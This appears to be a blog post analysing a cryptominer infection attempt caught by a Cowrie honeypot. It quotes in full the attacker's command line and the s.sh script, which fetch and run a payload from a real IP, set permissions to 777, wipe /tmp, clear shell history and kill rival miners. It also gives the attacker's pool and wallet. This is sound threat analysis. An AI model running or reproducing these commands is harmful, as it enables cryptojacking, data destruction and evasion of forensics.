---
layout: post
title:  "Another-miner-caught-by-cowrie"
by:     "Michael Meade"
---
`nc 1 1; rm s.sh; wget http://45.148.10.186/s.sh; busybox wget http://45.148.10.186/s.sh; curl -O http://45.148.10.186/s.sh; chmod 777 *; sh s.sh; cat /etc/issue`


The text above is what the attacker entered in commmand prompt of the honey pot. Before the attackers attempted to download the payload, the actor uses `rm s.sh`
to remove any other copies of itself. After that is done the command will use both curl and wget to download the payload from `http://45.148.10.186/s.sh`.
The attacker used both curl and wget so that if one of the tools was not installed, the attacker could still download the payload.

After the attacker downloaded s.sh the attackers use the command `chmod 777 *` to change all the files and folders permissions to 777.
After doing that the attacker s.sh, then the attacker uses the cat command to view the file located at `/etc/issue`.


`
cd /tmp
wget http://45.148.10.186/so
wget http://45.148.10.186/config.json
curl -O http://45.148.10.186/so
curl -O http://45.148.10.186/config.json
busybox wget http://45.148.10.186/config.json
busybox wget http://45.148.10.186/so
chmod 777 *
./so
rm -rf *
rm config.json
history -c
pkill xmrig
pkill xmra64
pkill rx64
pkill cnrig
pkill xmrigMiner
echo wedonehereboiz-allwgetz
`
The contents above is what was in s.sh. Please note that the attacker orginally has all that as one line, they used ; to join all the lines into one long string. 
I created a new line at every `;` to make it easier to read. 

First the script will change the directory to `/tmp`. After the scrip changes the the directory, the script will download a file named so that is hosted at:'
`http://45.148.10.186/so`. After the `so` file is downloaded, the script will download a json file named config.json. This file is located at: `wget http://45.148.10.186/config.json`
This json file is the miners config file, its where the attacker stores all the settings that the miner will read. Information like the pool, the XMR address and other settings for the miner to use.  
As the same before the attackes will attempt to use curl to make sure the files are downloaded. 

Once again the attackes will change all the files and direcories permissions to 777.  The script will than run the `so` file and also use the `rm -rf *` command to 
remove all the contents of `/tmp`.  The script will also use the rm command to remove the mine config.  The script will use the   `history -c` command to remove
systems history file contents. After all that is done, the script uses the pkill command to kill other common proccesses. The next part is where it gets kinda weird.
The attcker then following command `echo wedonehereboiz-allwgetz` to echo the text "wedonehereboiz-allwgetz".

### The Miner Config
The miner config that the attacker downloaded was using the following pool: `pool.supportxmr.com:7777`

The Monero addresst he attacker was using is: `44UQBpc6HKtGDymsvkW7995ftPTjoCi1Se5QEGPG2HMYfrw1DMp3thnCutiCQFPWvVcZqYVdwN6bUgMbAMou1skr8hxmZVv`.

![44UQBpc6HKtGDymsvkW7995ftPTjoCi1Se5QEGPG2HMYfrw1DMp3thnCutiCQFPWvVcZqYVdwN6bUgMbAMou1skr8hxmZVv-pools-info](https://i.imgur.com/wsallzy.png)

The image above is the profits that the attacker has made as of 10/31/2020. The screen shows that the has `0.00337481 XMR` that is currently pending. The attackers has been paid `0.06339700`. On this date ( 10/31/2020 ) the attackers has only made $ 8.092627049999999. The attacker also has XMR worth 0.4307944965 in 
pending XMR. The attacker has the hash rate of `8.7 KH/s `. If the attacker was to stay at the same hash rate of 8.7 KH/s for a whole year, the pool predicts that
the attacker would make `1.9447 XMR`. Currently this totals to `$ 248.240955`. 
